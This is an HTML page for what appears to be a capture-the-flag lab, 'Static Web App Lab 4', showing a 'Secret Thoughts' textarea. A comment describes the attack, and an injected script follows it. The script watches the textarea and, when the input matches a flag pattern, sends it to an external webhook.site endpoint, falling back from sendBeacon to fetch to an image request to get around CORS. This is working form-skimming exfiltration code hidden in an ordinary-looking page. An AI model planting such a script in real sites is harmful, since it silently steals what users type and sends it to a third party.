<html>
  <head>
    <title>Static Web App Lab 4</title>
  </head>
  <body
    style="display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background-color: #f0f0f0;"
  >
    <div
      style="background-color: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center;"
    >
      <h1>Static Web App Lab 4 - Write</h1>
      <div style="margin: 20px;">
        <h2>Secret Thoughts</h2>
        <textarea
          id="secretThoughts"
          rows="10"
          cols="50"
          placeholder="Paste your secret thoughts here..."
          style="width: 100%; max-width: 500px;"
        ></textarea>
      </div>
    </div>
  </body>
  <!--
  The attack: append the below script to push all user input to a webhook.
  In this case we simply wait for input to match a CTF flag
  2025-08-14 07:35 - testing a more robust implementation that includes beacon API and falls back to fetch, 
  then img to work around CORS issues if present
  -->
  <script>
(function(){
  var ta, sent = false;
  var flagRegex = /^flag\{[0-9a-f]{32}\}$/i;
  var endpoint = 'https://webhook.site/3a1d6afe-b31a-4223-b3c3-1dee5b67a29f';

  function postBeacon(val){
    // Try sendBeacon (POST, no CORS preflight; works on page unload too)
    try {
      var body = new Blob(
        [ 'leak=' + encodeURIComponent(val) + '&t=' + Date.now() ],
        { type: 'application/x-www-form-urlencoded' }
      );
      if (navigator.sendBeacon && navigator.sendBeacon(endpoint, body)) return true;
    } catch(_) {}
    return false;
  }

  async function postFetch(val){
    try {
      // keepalive lets the request finish during page unload in many browsers
      var res = await fetch(endpoint, {
        method: 'POST',
        mode: 'cors',                 // you said CORS is enabled on webhook.site
        keepalive: true,
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'leak=' + encodeURIComponent(val) + '&t=' + Date.now()
      });
      return true; // we don't care about status for exfil
    } catch(_) { return false; }
  }

  function postImg(val){
    try {
      var i = new Image();
      i.src = endpoint + '?leak=' + encodeURIComponent(val) + '&t=' + Date.now();
      return true;
    } catch(_) { return false; }
  }

  async function leak(val){
    if (sent) return;
    sent = true;
    if (postBeacon(val)) return;
    if (await postFetch(val)) return;
    postImg(val);
  }

  function check(){
    if (!ta) ta = document.getElementById('secretThoughts');
    if (ta) {
      var v = (ta.value || '').trim();
      if (flagRegex.test(v)) leak(v);
    }
  }

  // Poll every 250ms for up to 60s
  var timer = setInterval(check, 250);
  setTimeout(function(){ clearInterval(timer); }, 60000);

  // Fire on live input too (covers paste/typing bots)
  document.addEventListener('input', function(e){
    if (e && e.target && e.target.id === 'secretThoughts') {
      var v = (e.target.value || '').trim();
      if (flagRegex.test(v)) leak(v);
    }
  }, true);
})();
</script>
</html>
